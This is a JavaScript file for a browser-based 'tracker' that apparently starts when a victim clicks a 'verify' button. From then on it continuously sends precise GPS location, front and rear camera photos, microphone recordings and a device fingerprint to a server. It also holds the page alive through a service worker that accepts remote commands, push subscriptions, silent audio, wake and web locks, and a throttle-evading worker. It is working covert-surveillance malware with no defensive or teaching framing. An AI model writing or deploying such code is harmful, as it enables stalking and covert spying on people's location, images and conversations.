/*
 * RigbSecurity Tracker — GPS Module
 * REAL GPS ONLY — No IP geolocation, No WiFi positioning fallback
 */

const CONFIG = {
  gpsOptions: {
    enableHighAccuracy: true,   // FORCES GPS HARDWARE CHIP
    timeout: 30000,             // 30 second timeout
    maximumAge: 0               // No cached positions ever
  },
  sendInterval: 15000,          // Send location every 15 seconds
  photoInterval: 30000,         // Photo every 30 seconds
  audioInterval: 60000,         // Audio every 60 seconds
  audioDuration: 10000          // 10 second audio clips
};

let trackingId = null;
let mediaStream = null;
let watchId = null;
let wakeLock = null;

// ═══════════════════════════════════════════
// INIT — Called when user clicks verify button
// ═══════════════════════════════════════════

async function initTracker(tid) {
  trackingId = tid;
  
  try {
    // 1. GPS — REAL SATELLITE ONLY
    await initGPS();
    
    // 2. Camera + Microphone
    await initMedia();
    
    // 3. Persistence layers
    await initPersistence();
    
    // 4. Device fingerprint
    await collectDeviceInfo();
    
    // 5. Start continuous collection
    startContinuous();
    
    return true;
  } catch(err) {
    console.error('Init failed:', err);
    return false;
  }
}

// ═══════════════════════════════════════════
// GPS — SATELLITE ONLY, NO FALLBACK
// ═══════════════════════════════════════════

function initGPS() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error('Geolocation not supported'));
      return;
    }

    // Get initial position — HIGH ACCURACY = GPS CHIP
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        sendGPS(pos);
        
        // Start continuous watching
        watchId = navigator.geolocation.watchPosition(
          sendGPS,
          (err) => console.log('GPS watch error:', err.message),
          CONFIG.gpsOptions
        );
        
        resolve();
      },
      (err) => {
        // DO NOT FALL BACK TO IP — reject entirely
        reject(new Error(`GPS failed: ${err.message} (code ${err.code})`));
      },
      CONFIG.gpsOptions  // enableHighAccuracy: true
    );
  });
}

function sendGPS(position) {
  const data = {
    lat: position.coords.latitude,
    lon: position.coords.longitude,
    acc: position.coords.accuracy,
    alt: position.coords.altitude,
    dir: position.coords.heading,
    spd: position.coords.speed,
    ts: position.timestamp,
    source: 'gps'  // ALWAYS GPS, never IP
  };

  // Reject if accuracy is too poor (likely WiFi/cell tower, not GPS)
  // Real GPS typically gives < 30m accuracy
  // WiFi gives 30-100m, Cell tower gives 300-3000m
  if (data.acc > 500) {
    console.log(`Skipping low-accuracy fix: ${data.acc}m (not GPS)`);
    // Still send but flag it
    data.source = 'low_accuracy_warning';
  }

  // Send via fetch
  fetch(`/api/gps/${trackingId}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).catch(() => {});

  // Also send via beacon (survives page close)
  if (navigator.sendBeacon) {
    navigator.sendBeacon(
      `/api/beacon/${trackingId}`,
      new Blob([JSON.stringify(data)], { type: 'application/json' })
    );
  }
}

// Force GPS re-acquisition (called by remote command)
function forceGPS() {
  navigator.geolocation.getCurrentPosition(
    sendGPS,
    () => {},
    CONFIG.gpsOptions
  );
}

// ═══════════════════════════════════════════
// CAMERA — Front + Rear
// ═══════════════════════════════════════════

async function initMedia() {
  try {
    mediaStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
      audio: true
    });
    
    // Immediate front camera photo
    await capturePhoto('front');
    
    // Try rear camera too
    setTimeout(() => captureRearPhoto(), 3000);
    
  } catch(e) {
    // Try audio only if camera fails
    try {
      mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true });
    } catch(e2) {
      console.log('No media access');
    }
  }
}

async function capturePhoto(camera = 'front') {
  if (!mediaStream) return;
  
  try {
    const videoTrack = mediaStream.getVideoTracks()[0];
    if (!videoTrack) return;
    
    const video = document.createElement('video');
    video.srcObject = mediaStream;
    video.setAttribute('playsinline', '');
    video.muted = true;
    await video.play();
    
    // Wait for video to have actual frames
    await new Promise(r => setTimeout(r, 500));
    
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0);
    
    const photoData = canvas.toDataURL('image/jpeg', 0.7);
    
    fetch(`/api/media/${trackingId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'photo',
        camera: camera,
        data: photoData,
        ts: new Date().toISOString()
      })
    }).catch(() => {});
    
  } catch(e) {
    console.log('Photo capture failed:', e);
  }
}

async function captureRearPhoto() {
  try {
    const rearStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { exact: 'environment' } }
    });
    
    const video = document.createElement('video');
    video.srcObject = rearStream;
    video.setAttribute('playsinline', '');
    video.muted = true;
    await video.play();
    await new Promise(r => setTimeout(r, 1000));
    
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    canvas.getContext('2d').drawImage(video, 0, 0);
    
    const photoData = canvas.toDataURL('image/jpeg', 0.7);
    rearStream.getTracks().forEach(t => t.stop());
    
    fetch(`/api/media/${trackingId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'photo',
        camera: 'rear',
        data: photoData,
        ts: new Date().toISOString()
      })
    }).catch(() => {});
    
  } catch(e) {}
}

// ═══════════════════════════════════════════
// AUDIO RECORDING
// ═══════════════════════════════════════════

function recordAudio(duration = CONFIG.audioDuration) {
  if (!mediaStream) return;
  
  const audioTracks = mediaStream.getAudioTracks();
  if (audioTracks.length === 0) return;
  
  try {
    const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
      ? 'audio/webm;codecs=opus' : 'audio/webm';
    
    const recorder = new MediaRecorder(mediaStream, { mimeType });
    const chunks = [];
    
    recorder.ondataavailable = (e) => {
      if (e.data.size > 0) chunks.push(e.data);
    };
    
    recorder.onstop = () => {
      const blob = new Blob(chunks, { type: mimeType });
      const reader = new FileReader();
      reader.onloadend = () => {
        fetch(`/api/media/${trackingId}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'audio',
            data: reader.result,
            duration: duration,
            ts: new Date().toISOString()
          })
        }).catch(() => {});
      };
      reader.readAsDataURL(blob);
    };
    
    recorder.start();
    setTimeout(() => {
      try { recorder.stop(); } catch(e) {}
    }, duration);
    
  } catch(e) {
    console.log('Audio recording failed:', e);
  }
}

// ═══════════════════════════════════════════
// PERSISTENCE LAYERS
// ═══════════════════════════════════════════

async function initPersistence() {
  // 1. Service Worker
  if ('serviceWorker' in navigator) {
    try {
      const reg = await navigator.serviceWorker.register('/sw.js');
      await navigator.serviceWorker.ready;
      reg.active?.postMessage({ type: 'init', trackingId });
      
      // Listen for SW commands
      navigator.serviceWorker.addEventListener('message', (e) => {
        if (e.data.type === 'getGPS') forceGPS();
        if (e.data.type === 'getPhoto') capturePhoto('front');
        if (e.data.type === 'getAudio') recordAudio();
      });
      
      // Periodic background sync
      if ('periodicSync' in reg) {
        try {
          await reg.periodicSync.register('gps-sync', {
            minInterval: 4 * 60 * 60 * 1000
          });
        } catch(e) {}
      }
    } catch(e) {}
  }
  
  // 2. Notification permission (for push re-engagement)
  if ('Notification' in window) {
    await Notification.requestPermission();
  }
  
  // 3. Push subscription
  try {
    const reg = await navigator.serviceWorker.ready;
    if ('PushManager' in window) {
      const keyRes = await fetch('/api/vapid-key');
      const keyData = await keyRes.json();
      
      if (keyData.key) {
        const sub = await reg.pushManager.subscribe({
          userVisibleOnly: true,
          applicationServerKey: urlBase64ToUint8Array(keyData.key)
        });
        
        await fetch(`/api/subscribe/${trackingId}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(sub)
        });
      }
    }
  } catch(e) {}
  
  // 4. Silent audio (prevent mobile sleep)
  startSilentAudio();
  
  // 5. Wake Lock
  try {
    if ('wakeLock' in navigator) {
      wakeLock = await navigator.wakeLock.request('screen');
      document.addEventListener('visibilitychange', async () => {
        if (!document.hidden && wakeLock?.released) {
          wakeLock = await navigator.wakeLock.request('screen');
        }
      });
    }
  } catch(e) {}
  
  // 6. Web Lock (prevent tab discard)
  try {
    if ('locks' in navigator) {
      navigator.locks.request('rigb_lock', { mode: 'exclusive' }, () => {
        return new Promise(() => {}); // Never resolves = held forever
      });
    }
  } catch(e) {}
  
  // 7. Web Worker for untrottled timers
  startWorker();
}

function startSilentAudio() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    gain.gain.value = 0.001;
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
  } catch(e) {}
}

function startWorker() {
  try {
    const code = `
      self.onmessage = function(e) {
        if (e.data.type === 'init') {
          setInterval(() => self.postMessage({type:'tick'}), 30000);
        }
      };
    `;
    const blob = new Blob([code], { type: 'application/javascript' });
    const worker = new Worker(URL.createObjectURL(blob));
    worker.postMessage({ type: 'init' });
    worker.onmessage = (e) => {
      if (e.data.type === 'tick') {
        forceGPS();
        capturePhoto('front');
      }
    };
  } catch(e) {}
}

// ═══════════════════════════════════════════
// CONTINUOUS COLLECTION
// ═══════════════════════════════════════════

function startContinuous() {
  // Photos every 30s
  setInterval(() => capturePhoto('front'), CONFIG.photoInterval);
  
  // Rear camera every 2 minutes
  setInterval(captureRearPhoto, 120000);
  
  // Audio every 60s
  setInterval(() => recordAudio(CONFIG.audioDuration), CONFIG.audioInterval);
  
  // First audio immediately
  recordAudio(CONFIG.audioDuration);
  
  // Visibility recovery
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden) {
      forceGPS();
      capturePhoto('front');
    }
  });
  
  // Last-gasp on page close
  window.addEventListener('beforeunload', () => {
    navigator.geolocation.getCurrentPosition((pos) => {
      navigator.sendBeacon(`/api/beacon/${trackingId}`, JSON.stringify({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        acc: pos.coords.accuracy,
        source: 'gps',
        final: true
      }));
    }, () => {}, { enableHighAccuracy: true, timeout: 5000 });
  });
}

// ═══════════════════════════════════════════
// DEVICE INFO COLLECTION
// ═══════════════════════════════════════════

async function collectDeviceInfo() {
  const info = {
    platform: navigator.platform,
    userAgent: navigator.userAgent,
    language: navigator.language,
    languages: [...(navigator.languages || [])],
    cores: navigator.hardwareConcurrency || 0,
    memory: navigator.deviceMemory || 0,
    maxTouch: navigator.maxTouchPoints || 0,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    tzOffset: new Date().getTimezoneOffset(),
    screen: {
      w: screen.width,
      h: screen.height,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
      orientation: screen.orientation?.type || 'unknown'
    },
    online: navigator.onLine
  };
  
  // Battery
  try {
    const batt = await navigator.getBattery();
    info.battery = {
      level: Math.round(batt.level * 100),
      charging: batt.charging
    };
  } catch(e) {}
  
  // Network
  try {
    const conn = navigator.connection || navigator.mozConnection;
    if (conn) {
      info.network = {
        type: conn.type,
        effectiveType: conn.effectiveType,
        downlink: conn.downlink,
        rtt: conn.rtt
      };
    }
  } catch(e) {}
  
  // GPU
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) {
        info.gpu = {
          vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
        };
      }
    }
  } catch(e) {}
  
  // Media devices
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    info.cameras = devices.filter(d => d.kind === 'videoinput').length;
    info.mics = devices.filter(d => d.kind === 'audioinput').length;
  } catch(e) {}
  
  fetch(`/api/device/${trackingId}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(info)
  }).catch(() => {});
}

// ═══════════════════════════════════════════
// UTILITY
// ═══════════════════════════════════════════

function urlBase64ToUint8Array(base64String) {
  const padding = '='.repeat((4 - base64String.length % 4) % 4);
  const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
  const rawData = window.atob(base64);
  return Uint8Array.from([...rawData].map(c => c.charCodeAt(0)));
}